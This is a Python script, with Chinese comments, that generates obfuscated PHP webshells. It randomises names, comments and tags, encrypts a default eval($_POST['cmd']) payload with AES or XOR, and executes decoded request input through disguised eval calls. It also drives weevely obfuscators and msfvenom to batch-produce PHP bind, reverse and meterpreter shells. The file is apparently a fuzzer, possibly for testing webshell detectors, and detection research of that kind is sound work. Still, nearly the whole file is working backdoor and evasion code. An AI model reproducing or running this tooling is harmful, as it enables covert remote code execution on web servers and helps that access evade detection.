import os
import random
import tqdm
import string
import argparse
from typing import Tuple
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import subprocess
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

logger = logging.getLogger(__name__)
logger.addHandler(logging.StreamHandler())
logger.setLevel(logging.INFO)

def random_var(length=None):
    if length is None:
        length = random.randint(5, 12)  # 随机长度
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_iv():
    return os.urandom(16)

def aes_encrypt(data: bytes, key: bytes) -> Tuple[bytes, bytes]:
    iv = generate_iv()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(data, AES.block_size)
    return cipher.encrypt(padded), iv

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    # 增加key复杂度
    expanded_key = (key * ((len(data) // len(key)) + 1))[:len(data)]
    return bytes([b ^ k for b, k in zip(data, expanded_key)])

def generate_webshell(payload: str, enc_mode: str, key: str) -> Tuple[str, str]:
    key_bytes = key.encode()
    encoded_payload = b''
    iv = b''

    # 随机修改payload
    payload_variants = [
        payload,
        f"@{payload}",  # 添加错误抑制
        f"({payload})",  # 添加括号
        f"/* {random_var()} */ {payload}",  # 添加随机注释
    ]
    current_payload = random.choice(payload_variants)

    # 随机修改key
    salt = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
    current_key = key + salt

    if enc_mode == 'aes':
        encoded_payload, iv = aes_encrypt(current_payload.encode(), current_key.encode())
    elif enc_mode == 'xor':
        encoded_payload = xor_encrypt(current_payload.encode(), current_key.encode())
    else:
        encoded_payload = current_payload.encode()

    b64_payload = base64.b64encode(encoded_payload).decode()
    if iv:
        b64_iv = base64.b64encode(iv).decode()

    # 动态变量名和函数名
    var_names = {name: random_var() for name in ['key', 'cipher', 'payload', 'decode', 'exec_func', 'input', 'iv']}
    
    # 增加错误处理和混淆
    error_levels = ['E_ERROR', 'E_WARNING', 'E_PARSE', 'E_NOTICE']
    random.shuffle(error_levels)
    error_mask = ' | '.join(error_levels[:random.randint(2,3)])

    # 动态构造函数调用 - 增加混淆
    exec_methods = [
        f"(new class{{function __invoke($x){{eval($x);}}}})",
        f"create_function('', '$x=base64_decode(\"{base64.b64encode(b'eval($_[0]);').decode()}\");eval($x);')",
        f"function($x){{return eval($x);}}",
        f"(function($x){{eval($x);}})",
        f"array(new class{{public function __invoke($x){{eval($x);}}}}, '__invoke')"
    ]
    dynamic_eval = random.choice(exec_methods)

    # 随机PHP标签
    php_tags = [
        "<?php",
        f"<?php /* {random_var()} */",
        f"<?php // {random_var()}\n"
    ]
    php_tag = random.choice(php_tags)

    # 随机session启动方式
    session_starts = [
        "@session_start();",
        f"if(function_exists('session_start'))@session_start(); /* {random_var()} */",
        f"@session_start();@set_time_limit({random.randint(0,120)});",
        f"(function(){{@session_start();/* {random_var()} */}})();"
    ]
    session_start = random.choice(session_starts)

    # 随机input获取方式
    input_methods = [
        'file_get_contents("php://input")',
        f'$HTTP_RAW_POST_DATA /* {random_var()} */',
        'file_get_contents("php://stdin")',
        'stream_get_contents(STDIN)'
    ]
    input_method = random.choice(input_methods)

    # 随机空白字符
    def random_whitespace():
        spaces = [' ', '\t', ' ' * random.randint(1,4)]
        newlines = ['\n', '\n' * random.randint(1,2)]
        return ''.join(random.choices(spaces, k=random.randint(1,3))) + random.choice(newlines)

    # 随机注释
    def random_comment():
        comments = [
            f"/* {random_var()} */",
            f"// {random_var()}",
            f"#[{random_var()}]"
        ]
        return random.choice(comments) if random.random() > 0.5 else ''

    webshell = f"""{php_tag}{random_whitespace()}
{session_start}{random_whitespace()}
{random_comment()}{random_whitespace()}
error_reporting({error_mask});{random_whitespace()}
${var_names['key']} = "{current_key}";{random_whitespace()}
${var_names['input']} = {input_method};{random_whitespace()}

if (function_exists("openssl_decrypt")) {{{random_whitespace()}
    ${var_names['iv']} = "{b64_iv if iv else ''}";{random_whitespace()}
    ${var_names['decode']} = openssl_decrypt({random_whitespace()}
        base64_decode(${var_names['input']}),{random_whitespace()}
        "AES-128-CBC",{random_whitespace()}
        ${var_names['key']},{random_whitespace()}
        OPENSSL_RAW_DATA,{random_whitespace()}
        base64_decode(${var_names['iv']}){random_whitespace()}
    );{random_whitespace()}
}} else {{{random_whitespace()}
    ${var_names['decode']} = base64_decode(${var_names['input']});{random_whitespace()}
    ${var_names['key']} = str_repeat(${var_names['key']}, ceil(strlen(${var_names['decode']}) / strlen(${var_names['key']})));{random_whitespace()}
    for ($i = 0; $i < strlen(${var_names['decode']}); $i++) {{{random_whitespace()}
        ${var_names['decode']}[$i] = ${var_names['decode']}[$i] ^ ${var_names['key']}[$i];{random_whitespace()}
    }}{random_whitespace()}
}}{random_whitespace()}

${var_names['exec_func']} = {dynamic_eval};{random_whitespace()}
@call_user_func(${var_names['exec_func']}, ${var_names['decode']});{random_whitespace()}
?>{random_whitespace()}"""

    return webshell, b64_payload

def generate_weevely_shell(password: str, output_path: str) -> str:
    """
    使用weevely工具生成加密的PHP webshell
    
    Args:
        password: weevely shell的密码
        output_path: 输出文件路径
        
    Returns:
        生成的shell文件路径
    """
    try:
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        cmd = ['weevely', 'generate', password, output_path]
        cmd2 = ['weevely', 'generate', '-obfuscator', 'obfusc1_php', password, output_path]
        cmd3 = ['weevely', 'generate', '-obfuscator', 'cleartext1_php', password, output_path]
        cmd4 = ['weevely', 'generate', '-obfuscator', 'phar', password, output_path]
        cmd_list = [cmd, cmd2, cmd3, cmd4]
        real_cmd = random.choice(cmd_list)
        subprocess.run(real_cmd, check=True, capture_output=True)
        if os.path.exists(output_path):
            return output_path
        else:
            raise RuntimeError("Weevely shell生成失败")
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"Weevely命令执行失败: {e.stderr.decode()}")
    except Exception as e:
        raise RuntimeError(f"生成Weevely shell时发生错误: {str(e)}")

def random_password(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_webshell_with_msf(output_path: str) -> str:
    """
    使用msfvenom随机生成一个payload
    
    Args:
        output_path: 输出文件路径
    
    Returns:
        生成的shell文件路径
    """
    supported_payloads = [
        'php/bind_perl_ipv6',
        'php/bind_perl',
        'php/bind_php_ipv6',
        'php/bind_php',
        'php/exec',
        'php/meterpreter/bind_tcp_ipv6',
        'php/meterpreter/bind_tcp_ipv6_uuid',
        'php/meterpreter/bind_tcp',
        'php/meterpreter/bind_tcp_uuid',
        'php/meterpreter_reverse_tcp',
        'php/meterpreter/reverse_tcp',
        'php/meterpreter/reverse_tcp_uuid',
        'php/reverse_perl',
        'php/reverse_php',
        'php/shell_findsock',
    ]
    supported_encoders = [
        'php/base64',
        'php/hex',
        'php/minify'
    ]
    host = '127.0.0.1'
    # 随机生成端口，确保每个线程使用不同的端口
    port = random.randint(10000, 65535)
    try:
        # 随机生成payload
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        payload = random.choice(supported_payloads)
        encoder = random.choice(supported_encoders)
        logger.info(f"[+] Generating msfvenom shell {output_path} with payload: {payload} and encoder: {encoder}")
        
        # 构建命令
        cmd = [
            'msfvenom',
            '-p', payload,
            f'LHOST={host}',
            f'LPORT={port}',
            '-f', 'raw',
            '-e', encoder,  # 修正encoder参数
            '-o', output_path
        ]
        
        # 执行命令并设置超时
        process = subprocess.run(
            cmd,
            check=True,
            capture_output=True,
            timeout=30  # 设置30秒超时
        )
        
        if os.path.exists(output_path):
            return output_path
        else:
            logger.error("msfvenom生成失败")
            return None
            
    except subprocess.TimeoutExpired:
        logger.error(f"msfvenom命令执行超时: {output_path}")
        return None
    except subprocess.CalledProcessError as e:
        logger.error(f"msfvenom命令执行失败: {e.stderr.decode()}")
        return None
    except Exception as e:
        logger.error(f"生成msfvenom shell时发生错误: {str(e)}")
        return None

def generate_msf_shells_parallel(num_shells: int, max_workers: int = 4) -> list:
    """
    并行生成多个MSF webshell
    
    Args:
        num_shells: 要生成的shell数量
        max_workers: 最大线程数
        
    Returns:
        成功生成的shell文件路径列表
    """
    successful_shells = []
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # 创建任务列表
        future_to_path = {
            executor.submit(
                generate_webshell_with_msf,
                f'output/msf_shell_{i}.php'
            ): f'output/msf_shell_{i}.php'
            for i in range(num_shells)
        }
        
        # 使用tqdm显示进度
        with tqdm.tqdm(total=num_shells, desc="Generating MSF shells") as pbar:
            for future in as_completed(future_to_path):
                path = future_to_path[future]
                try:
                    result = future.result()
                    if result:
                        successful_shells.append(result)
                except Exception as e:
                    logger.error(f"生成失败 {path}: {str(e)}")
                finally:
                    pbar.update(1)
    
    return successful_shells

def main():
    """
    生成 webshell 的 demo
    python3 demo1.py --num 10 --enc aes --key yourkey --payload "eval(\$_POST['cmd']);"
    """
    parser = argparse.ArgumentParser(description='WebShell Fuzzer Generator')
    parser.add_argument('-n', '--num', type=int, default=5, help='Number of webshells to generate')
    parser.add_argument('--enc', choices=['aes', 'xor', 'none'], default='xor', help='Encryption type')
    parser.add_argument('--key', type=str, default='e45e329feb5d925b', help='Encryption key')
    parser.add_argument('--payload', type=str, default="eval($_POST['cmd']);", help='Payload to embed')
    parser.add_argument('--weevely', action='store_true', help='Generate Weevely shell')
    parser.add_argument('--password', type=str, default='123456', help='Weevely shell password')
    parser.add_argument('--msf', action='store_true', help='Generate msfvenom shell')
    parser.add_argument('--threads', type=int, default=4, help='Number of threads for MSF shell generation')
    args = parser.parse_args()

    os.makedirs('output', exist_ok=True)
    try:
        if args.msf:
            logger.info(f"[+] 使用 {args.threads} 个线程生成 {args.num} 个 MSF webshell")
            successful_shells = generate_msf_shells_parallel(args.num, args.threads)
            logger.info(f"[+] 成功生成 {len(successful_shells)} 个 MSF webshell")
            for shell in successful_shells:
                logger.info(f"[+] 生成的shell: {shell}")
        else:
            for i in tqdm.tqdm(range(args.num)):
                if args.weevely:
                    password = random_password()
                    weevely_shell_path = f'output/weevely_shell_{i}.php'
                    logger.info(f"[+] Generating Weevely shell {weevely_shell_path} with password: {password}")
                    shell_code = generate_weevely_shell(password, weevely_shell_path)
                else:
                    shell_code, payload = generate_webshell(args.payload, args.enc, args.key)
                    with open(f'output/output_shell_{i}.php', 'w') as f:
                        f.write(shell_code)
                    with open(f'output/output_payload_{i}.txt', 'w') as f:
                        f.write(payload)
    except Exception as e:
        logger.error(f"[-] Error: {e}")

    logger.info(f"[+] Done. Generated shells in ./output")

if __name__ == '__main__':
    main()